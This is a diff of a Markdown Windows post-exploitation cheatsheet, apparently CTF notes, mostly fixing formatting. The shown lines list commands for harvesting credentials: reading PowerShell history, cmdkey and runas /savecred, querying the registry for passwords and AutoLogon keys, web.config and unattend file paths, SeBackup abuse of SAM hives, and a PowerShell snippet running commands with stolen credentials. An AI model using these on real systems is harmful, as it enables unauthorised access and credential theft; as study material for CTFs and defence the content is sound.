@@ -1,8 +1,8 @@
-
 ```markdown
 ## Windows Post-Exploitation Cheatsheet
 
 ### Unattended Windows Installations (Location of creds sometimes)
+
 ```
 
 C:\Unattend.xml
@@ -13,7 +13,8 @@ C:\Windows\system32\sysprep\sysprep.xml
 
 ````
 
-### Powershell History
+### PowerShell History
+
 ```cmd
 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ````
@@ -21,15 +22,15 @@ type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\Conso
 ### Saved Windows Credentials
 
 ```cmd
-cmdkey /list  
+cmdkey /list
 runas /savecred /user.:admin cmd.exe
 ```
 
 ### IIS Configuration (Inside web.config, creds may be found)
 
 ```
-C:\inetpub\wwwroot\web.config  
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config  
+C:\inetpub\wwwroot\web.config
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
 ```
 
 ```cmd
@@ -54,9 +55,10 @@ Some installer files can run with admin privileges.
 
 (Can be only found in CTF)
 
-### Current user with SeBackup / SeRestore access
+### Current User with SeBackup / SeRestore Access
 
 This access can be abused and SAM content and SYSTEM registry hive can be copied to extract the admin credentials.
+
 🔗 [https://0xdf.gitlab.io/2025/02/15/htb-cicada.html#exploit-sebackupprivilege](https://0xdf.gitlab.io/2025/02/15/htb-cicada.html#exploit-sebackupprivilege)
 
 ### Unpatched Software
@@ -69,7 +71,7 @@ The registry can be searched for keys and values that contain the word "password
 reg query HKLM /f password /t REG_SZ /s
 ```
 
-If you want to save some time, query this specific key to find admin AutoLogon credentials:
+To find admin AutoLogon credentials:
 
 ```cmd
 reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
@@ -94,9 +96,4 @@ PS C:\> $pass.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
 PS C:\> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $user, $secstr
 PS C:\> Invoke-Command -ScriptBlock { whoami } -Credential $cred -Computer localhost
 sniper\chris
-```
-
-```
-
-Let me know if you want a table of contents or tags added at the top.
 ```
